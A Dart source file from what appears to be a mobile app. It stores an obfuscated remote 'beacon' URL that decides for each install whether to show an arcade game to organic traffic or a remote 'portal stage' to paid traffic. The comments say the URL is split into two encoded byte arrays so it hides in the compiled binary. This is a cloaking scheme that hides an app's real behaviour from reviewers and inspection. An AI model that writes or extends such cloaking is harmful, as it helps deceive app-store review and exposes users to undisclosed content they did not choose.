import '../codec/obscure.dart';

// ─────────────────────────────────────────────────────────────────────────────
// BEACON SECRETS — config endpoint URL (obfuscated)
// ─────────────────────────────────────────────────────────────────────────────
// The "beacon" is the POST endpoint that decides, per install, whether to
// hand back a content URL (paid traffic → portal stage) or to refuse
// (organic traffic → arcade gameplay).
//
// The full endpoint URL is encoded with the project codec. To regenerate
// the byte arrays after a seed/URL change, run a one-off Dart script that
// calls codec.hide(plaintext) and print the result, then paste the array
// into the const below.
//
// IMPORTANT: never run encode loops in PowerShell — its integers wrap at
// 32 bits and the resulting bytes are wrong; the symptom is a misleading
// "FormatException: Invalid HTTP header field value" inside the http
// client. Always use the Dart helper.
// ─────────────────────────────────────────────────────────────────────────────

// The URL is split into "origin" and "route" parts so they appear as two
// unrelated blobs in the compiled binary. Concatenated at runtime.
const List<int> _beaconOrigin = <int>[
  0xa4, 0xed, 0x65, 0x48, 0x5e, 0x62, 0xc5, 0xfa, 0xe9, 0xfa, 0x61,
  0xbb, 0xc6, 0x36, 0xdd, 0x73, 0x54, 0xad, 0x0b, 0xe0, 0xb2, 0xec,
];

const List<int> _beaconRoute = <int>[
  0xe3, 0xfa, 0x7e, 0x56, 0x4b, 0x31, 0x8d, 0xfb, 0xfd, 0xe0, 0x63,
];

/// Returns the full beacon endpoint URL or an empty string if not yet wired.
/// The dispatch layer treats an empty string as "no remote configured →
/// stay on the arcade flow".
String resolveBeaconUrl() {
  if (_beaconOrigin.isEmpty) return '';
  return reveal(_beaconOrigin) + reveal(_beaconRoute);
}
